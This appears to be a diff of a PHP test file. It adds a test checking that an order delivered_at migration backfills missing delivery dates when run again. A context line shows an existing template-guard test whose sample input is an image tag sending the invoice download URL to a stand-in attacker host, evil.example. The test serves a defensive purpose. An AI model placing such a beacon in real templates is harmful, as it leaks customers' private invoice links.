@@ -34,3 +34,19 @@ foreach (['<p><img src="https://evil.example/p.gif?u={{invoice_download_url}}" a
     '<p><a href="{{invoice_download_url}}" title="{{invoice_download_url}}">Invoice</a></p>'] as $r9lLeak) {
     assert_true(str_contains($r9lInvoiceErrors($r9lLeak), 'invoice_download_url'), 'R9 template guard: the invoice link may not be part of another URL or attribute (' . $r9lLeak . ')');
 }
+
+// orders.delivered_at migration: it returned as soon as the column existed, so a run that stopped after the ALTER (a MySQL
+// ALTER commits on its own) never backfilled the delivered orders. The backfill now runs for delivered orders still
+// without a date, and keeps a date already recorded.
+$r9lDa = new PDO('sqlite::memory:', null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
+$r9lDa->exec("CREATE TABLE orders (id INTEGER PRIMARY KEY, status TEXT, created_at TEXT, updated_at TEXT, delivered_at TEXT DEFAULT NULL)");
+$r9lDa->exec("CREATE TABLE shipments (id INTEGER PRIMARY KEY, order_id INTEGER, delivered_at TEXT)");
+$r9lDa->exec("INSERT INTO orders VALUES (1, 'delivered', '2026-10-01 08:00:00', '2026-10-05 09:00:00', NULL), (2, 'delivered', '2026-10-01 08:00:00', '2026-10-06 09:00:00', '2026-10-02 10:00:00'),
+    (3, 'paid', '2026-10-01 08:00:00', '2026-10-02 09:00:00', NULL)");
+$r9lDa->exec("INSERT INTO shipments VALUES (1, 1, '2026-10-04 12:00:00')");
+$r9lDaMigration = require TEST_CLI_DIR . '/../migrations/20261020140000_order_delivered_at.php';
+$r9lDaMigration->up($r9lDa, true);
+$r9lDaMigration->up($r9lDa, true);
+assert_equals(['2026-10-04 12:00:00', '2026-10-02 10:00:00', null], $r9lDa->query('SELECT delivered_at FROM orders ORDER BY id')->fetchAll(PDO::FETCH_COLUMN),
+    'R9 migrations: a re-run of the delivered_at migration backfills a delivered order the stopped run left without a date, keeps a recorded date');
+$r9lDa = null;
